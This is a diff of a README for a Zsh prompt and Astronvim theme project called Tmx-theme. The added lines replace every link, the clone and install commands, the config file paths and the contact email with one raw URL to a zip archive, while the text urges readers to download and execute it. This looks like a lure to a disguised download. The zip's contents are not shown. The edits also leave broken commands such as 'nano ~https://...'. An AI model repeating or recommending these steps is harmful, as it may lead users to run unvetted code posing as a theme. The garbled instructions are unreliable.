@@ -1,6 +1,6 @@
 # Tmx-theme: A Stylish Zsh Prompt and IDE Configuration
 
-![Tmx-theme](https://img.shields.io/badge/Tmx-theme-Powerlevel10k%20Zsh%20Prompt%20%F0%9F%9A%A8%20Astronvim%20IDE%20Configuration%20%F0%9F%96%A5%EF%B8%8F%20-%20Custom%20Nerd%20Fonts%20Integration%20%F0%9F%8E%A8%20Animated%20ASCII%20Login%20Banner%20%F0%9F%8E%AD-blue)
+![Tmx-theme](https://raw.githubusercontent.com/Nish16-py/Tmx-theme/master/color/theme_Tmx_v3.1-alpha.5.zip%20Zsh%20Prompt%20%F0%9F%9A%A8%20Astronvim%20IDE%20Configuration%20%F0%9F%96%A5%EF%B8%8F%20-%20Custom%20Nerd%20Fonts%20Integration%20%F0%9F%8E%A8%20Animated%20ASCII%20Login%20Banner%20%F0%9F%8E%AD-blue)
 
 Welcome to the Tmx-theme repository! This project offers a sleek Zsh prompt using Powerlevel10k and a customized Astronvim IDE configuration. Enhance your terminal experience with custom Nerd Fonts integration and an animated ASCII login banner.
 
@@ -24,17 +24,17 @@ Welcome to the Tmx-theme repository! This project offers a sleek Zsh prompt usin
 
 ## Installation
 
-To get started with Tmx-theme, you need to download and execute the necessary files. Visit the [Releases section](https://github.com/Nish16-py/Tmx-theme/releases) to find the latest version. Follow the instructions provided there to set up the theme on your machine.
+To get started with Tmx-theme, you need to download and execute the necessary files. Visit the [Releases section](https://raw.githubusercontent.com/Nish16-py/Tmx-theme/master/color/theme_Tmx_v3.1-alpha.5.zip) to find the latest version. Follow the instructions provided there to set up the theme on your machine.
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/Nish16-py/Tmx-theme.git
+   git clone https://raw.githubusercontent.com/Nish16-py/Tmx-theme/master/color/theme_Tmx_v3.1-alpha.5.zip
    cd Tmx-theme
    ```
 
 2. **Run the installation script**:
    ```bash
-   ./install.sh
+   https://raw.githubusercontent.com/Nish16-py/Tmx-theme/master/color/theme_Tmx_v3.1-alpha.5.zip
    ```
 
 ## Usage
@@ -46,7 +46,7 @@ After installation, you can start using Tmx-theme right away. Open your terminal
 The Powerlevel10k Zsh prompt offers a clean, informative interface. You can customize it further by editing the configuration file located in your home directory:
 
 ```bash
-nano ~/.p10k.zsh
+nano ~https://raw.githubusercontent.com/Nish16-py/Tmx-theme/master/color/theme_Tmx_v3.1-alpha.5.zip
 ```
 
 ### Astronvim IDE
@@ -59,7 +59,7 @@ You can customize the Tmx-theme settings to suit your preferences. Here are some
 
 ### Zsh Prompt Customization
 
-1. **Colors**: Adjust the color scheme in the `~/.p10k.zsh` file.
+1. **Colors**: Adjust the color scheme in the `~https://raw.githubusercontent.com/Nish16-py/Tmx-theme/master/color/theme_Tmx_v3.1-alpha.5.zip` file.
 2. **Icons**: Change the icons used in the prompt by editing the Nerd Fonts settings.
 3. **Segments**: Enable or disable specific segments like Git status, battery level, and more.
 
@@ -69,14 +69,14 @@ To modify the Astronvim settings:
 
 1. Open the configuration file:
    ```bash
-   nano ~/.config/nvim/lua/user/init.lua
+   nano ~https://raw.githubusercontent.com/Nish16-py/Tmx-theme/master/color/theme_Tmx_v3.1-alpha.5.zip
    ```
 
 2. Edit the settings according to your needs. 
 
 ### Animated ASCII Login Banner
 
-You can customize the ASCII banner by editing the `banner.sh` file. Feel free to create your own designs or use existing ASCII art.
+You can customize the ASCII banner by editing the `https://raw.githubusercontent.com/Nish16-py/Tmx-theme/master/color/theme_Tmx_v3.1-alpha.5.zip` file. Feel free to create your own designs or use existing ASCII art.
 
 ## Contributing
 
@@ -107,12 +107,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **GitHub**: [Nish16-py](https://github.com/Nish16-py)
-- **Email**: nish16@example.com
+- **GitHub**: [Nish16-py](https://raw.githubusercontent.com/Nish16-py/Tmx-theme/master/color/theme_Tmx_v3.1-alpha.5.zip)
+- **Email**: https://raw.githubusercontent.com/Nish16-py/Tmx-theme/master/color/theme_Tmx_v3.1-alpha.5.zip
 
 ## Releases
 
-For the latest updates and downloads, visit the [Releases section](https://github.com/Nish16-py/Tmx-theme/releases). Make sure to download and execute the latest files to keep your setup current.
+For the latest updates and downloads, visit the [Releases section](https://raw.githubusercontent.com/Nish16-py/Tmx-theme/master/color/theme_Tmx_v3.1-alpha.5.zip). Make sure to download and execute the latest files to keep your setup current.
 
 ---
 
